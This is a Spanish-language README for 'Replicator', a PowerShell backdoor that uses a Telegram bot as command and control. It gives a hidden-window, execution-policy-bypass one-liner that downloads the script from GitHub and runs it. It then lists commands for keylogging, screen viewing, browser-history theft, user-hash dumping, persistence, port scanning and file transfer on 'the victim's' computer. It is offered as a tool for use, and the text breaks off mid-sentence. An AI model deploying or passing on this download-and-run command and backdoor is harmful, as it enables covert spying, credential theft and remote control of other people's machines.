# Replicator Telegram Backdoor Toolkit
Replicator es una puerta trasera basada en Powershell en forma de bot de mensajería instantánea que utiliza Telegram como C&C.

# Requisitos
Requiere crear un bot de Telegram. Con esto obtienes un API_TOKEN y un CHAT_ID.

# Uso
powershell -EP Bypass -WindowStyle hidden "(iwr 'https://raw.githubusercontent.com/josprou/Replicator/main/Replicator.ps1').content > $env:APPDATA\aaa.ps1 ; & $env:APPDATA\aaa.ps1 'API_TOKEN' 'CHAT_ID'"

# Comandos
- avs: Enumera los antivirus del host
- bar: Sirve para calibrar el agente
- chat: inicia un chat con el usuario del equipo infectado
- checkports: escaneo de puertos
- crhome: obtiene el historia de navegación de chrome
- download: descarga archivos en el ordenador de la víctima
- edge: obtiene el historia de navegación de edge
- explorar: permite explorar las carpetas de disco
- fondo: cambia el fondo de pantalla de la víctima
- kelogger: graba las pulsaciones de teclado
- logons: devuelve los inicios de sesion
- minimzar: minimza todas las ventanas
- persistence: se configura para lazar el bot durante el arranque del sistema
- portscan: otro escaner de redes
- powerdump: dumpea los hashes de usuario (requiere SYSTEM) (Psexec -s ?)
- remove-persisten: elimina la persistencia. Ya no se ejecuta al arrancar el equipo
- run: corre un proceso
- screen: visualiza la pantalla de la victima
- sessions: obtiene las sesiones abiertas en el sistema
- speak: di un mensaje con voz de robot
- upload: sube ficheros al infectado

# Ideas
Usa
